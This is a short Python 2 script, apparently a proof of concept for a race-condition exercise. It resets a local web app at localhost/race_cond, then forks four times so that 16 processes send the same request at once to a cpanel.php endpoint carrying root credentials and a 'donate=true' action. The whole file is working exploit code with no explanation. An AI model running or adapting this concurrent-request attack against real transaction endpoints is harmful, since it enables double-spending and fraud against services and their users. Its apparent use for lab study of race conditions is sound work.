import urllib2
import os
url = "http://localhost/race_cond/cpanel.php?name=root&pass=password&donate=true&id=2"
response = urllib2.urlopen("http://localhost/race_cond/reset.php")
html = response.read()

os.fork()
os.fork()
os.fork()
os.fork()
urllib2.urlopen(url)	